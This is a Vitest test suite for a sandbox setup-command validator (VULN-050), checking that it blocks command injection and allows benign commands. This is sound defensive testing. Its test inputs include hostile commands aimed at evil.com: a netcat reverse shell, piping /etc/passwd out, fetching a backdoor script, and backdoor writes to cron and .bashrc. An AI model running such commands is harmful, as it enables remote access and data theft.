import { describe, expect, it } from "vitest";
import { validateSetupCommand, SETUP_COMMAND_DENIED_PATTERNS } from "./docker.js";

describe("VULN-050: sandbox setupCommand validation", () => {
  describe("validateSetupCommand", () => {
    it("allows simple, safe commands", () => {
      expect(validateSetupCommand("apt-get update")).toBeUndefined();
      expect(validateSetupCommand("pip install requests")).toBeUndefined();
      expect(validateSetupCommand("npm install -g typescript")).toBeUndefined();
      expect(validateSetupCommand("mkdir -p /app/data")).toBeUndefined();
      expect(validateSetupCommand("echo hello")).toBeUndefined();
      // Commands with parentheses in quoted strings should be allowed
      expect(validateSetupCommand('echo "(test)"')).toBeUndefined();
      expect(validateSetupCommand('node -e "console.log(1)"')).toBeUndefined();
    });

    it("rejects command chaining with semicolons", () => {
      const result = validateSetupCommand("apt-get update; curl evil.com");
      expect(result).toBeDefined();
      expect(result).toContain("semicolon");
    });

    it("rejects command chaining with && operator", () => {
      const result = validateSetupCommand("apt-get update && curl evil.com");
      expect(result).toBeDefined();
      expect(result).toContain("&&");
    });

    it("rejects command chaining with || operator", () => {
      const result = validateSetupCommand("test -f /file || curl evil.com");
      expect(result).toBeDefined();
      expect(result).toContain("||");
    });

    it("rejects command substitution with backticks", () => {
      const result = validateSetupCommand("echo `whoami`");
      expect(result).toBeDefined();
      expect(result).toContain("backtick");
    });

    it("rejects command substitution with $()", () => {
      const result = validateSetupCommand("echo $(whoami)");
      expect(result).toBeDefined();
      expect(result).toContain("$(");
    });

    it("rejects pipe operators", () => {
      const result = validateSetupCommand("cat /etc/passwd | nc evil.com 1234");
      expect(result).toBeDefined();
      expect(result).toContain("pipe");
    });

    it("rejects output redirection with >", () => {
      const result = validateSetupCommand("echo backdoor > /etc/cron.d/evil");
      expect(result).toBeDefined();
      expect(result).toContain("redirect");
    });

    it("rejects append redirection with >>", () => {
      const result = validateSetupCommand("echo backdoor >> ~/.bashrc");
      expect(result).toBeDefined();
      expect(result).toContain("redirect");
    });

    it("rejects input redirection with <", () => {
      const result = validateSetupCommand("sh < /tmp/evil.sh");
      expect(result).toBeDefined();
      expect(result).toContain("redirect");
    });

    it("rejects newlines (multi-command injection)", () => {
      const result = validateSetupCommand("apt-get update\ncurl evil.com");
      expect(result).toBeDefined();
      expect(result).toContain("newline");
    });

    it("rejects curl/wget (data exfiltration prevention)", () => {
      // curl and wget are blocked entirely to prevent data exfiltration
      expect(validateSetupCommand("curl https://evil.com/backdoor.sh")).toBeDefined();
      expect(validateSetupCommand("wget http://evil.com/payload")).toBeDefined();
      expect(validateSetupCommand("curl --help")).toBeDefined();
      expect(validateSetupCommand("wget --version")).toBeDefined();
    });

    it("rejects eval command", () => {
      const result = validateSetupCommand("eval 'malicious code'");
      expect(result).toBeDefined();
      expect(result).toContain("eval");
    });

    it("rejects nc/netcat (reverse shell)", () => {
      expect(validateSetupCommand("nc -e /bin/sh evil.com 4444")).toBeDefined();
      expect(validateSetupCommand("netcat -lp 8080")).toBeDefined();
    });

    it("allows empty or whitespace-only commands", () => {
      expect(validateSetupCommand("")).toBeUndefined();
      expect(validateSetupCommand("   ")).toBeUndefined();
      expect(validateSetupCommand(undefined)).toBeUndefined();
    });

    it("rejects bash/sh -c with embedded commands", () => {
      const result = validateSetupCommand("bash -c 'curl evil.com'");
      expect(result).toBeDefined();
    });
  });

  describe("SETUP_COMMAND_DENIED_PATTERNS", () => {
    it("includes all critical injection patterns", () => {
      // Verify the patterns array exists and has entries
      expect(SETUP_COMMAND_DENIED_PATTERNS).toBeDefined();
      expect(SETUP_COMMAND_DENIED_PATTERNS.length).toBeGreaterThan(0);

      // Each entry should have pattern and reason
      for (const entry of SETUP_COMMAND_DENIED_PATTERNS) {
        expect(entry.pattern).toBeDefined();
        expect(entry.reason).toBeDefined();
        expect(typeof entry.reason).toBe("string");
      }
    });
  });
});
